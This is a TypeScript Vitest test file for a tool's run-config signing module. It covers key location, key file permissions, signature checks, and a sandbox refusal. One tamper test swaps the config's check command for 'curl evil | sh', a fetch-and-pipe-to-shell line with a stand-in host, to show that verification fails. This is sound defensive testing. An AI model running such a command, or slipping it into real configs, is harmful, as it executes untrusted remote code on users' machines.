import { existsSync, mkdtempSync, rmSync, statSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';
import { config_signed, sign_config, trust_key_path } from '../../src/trust.js';

const homes: string[] = [];

/** An env whose key lives in a fresh config home: one machine's. */
function machine(): Record<string, string> {
  const dir = mkdtempSync(join(tmpdir(), 'volley-trust-'));
  homes.push(dir);
  return { XDG_CONFIG_HOME: dir };
}

afterEach(() => {
  for (const dir of homes.splice(0)) rmSync(dir, { recursive: true, force: true });
});

const CONFIG = '{\n  "run_id": "r1",\n  "check": "pnpm test"\n}\n';

describe('trust_key_path', () => {
  it('sits under XDG_CONFIG_HOME, else ~/.config, ignoring a relative one', () => {
    expect(trust_key_path({ XDG_CONFIG_HOME: '/xdg' }, '/home/me')).toBe('/xdg/volley/run-key');
    expect(trust_key_path({}, '/home/me')).toBe('/home/me/.config/volley/run-key');
    expect(trust_key_path({ XDG_CONFIG_HOME: 'relative' }, '/home/me')).toBe(
      '/home/me/.config/volley/run-key',
    );
  });
});

describe('signing a run config', () => {
  it('holds for the text it signed, under a key it made that only its user can read', () => {
    const env = machine();
    const signature = sign_config(CONFIG, env);
    expect(signature).toMatch(/^[0-9a-f]{64}$/);
    expect(config_signed(CONFIG, signature, env)).toBe(true);
    expect(config_signed(CONFIG, `${signature ?? ''}\n`, env)).toBe(true);
    const key = trust_key_path(env);
    expect(statSync(key).mode & 0o777).toBe(0o600);
    expect(statSync(dirname(key)).mode & 0o777).toBe(0o700);
    // The key is made once and kept, so the same text signs the same way.
    expect(sign_config(CONFIG, env)).toBe(signature);
  });

  it("fails for a changed config, a missing or mangled signature, and another machine's key", () => {
    const env = machine();
    const signature = sign_config(CONFIG, env) ?? '';
    expect(config_signed(CONFIG.replace('pnpm test', 'curl evil | sh'), signature, env)).toBe(false);
    expect(config_signed(CONFIG, null, env)).toBe(false);
    expect(config_signed(CONFIG, 'not hex at all', env)).toBe(false);
    expect(config_signed(CONFIG, signature.slice(0, 32), env)).toBe(false);
    const other = machine();
    sign_config('anything', other);
    expect(config_signed(CONFIG, signature, other)).toBe(false);
  });

  it('signs nothing inside the sandbox, and makes no key there', () => {
    const env = { ...machine(), VOLLEY_CONTAINED: '1' };
    expect(sign_config(CONFIG, env)).toBeNull();
    expect(existsSync(trust_key_path(env))).toBe(false);
  });

  it('never makes the key to check a signature, so with no key nothing holds', () => {
    const env = machine();
    expect(config_signed(CONFIG, 'a'.repeat(64), env)).toBe(false);
    expect(existsSync(trust_key_path(env))).toBe(false);
  });
});
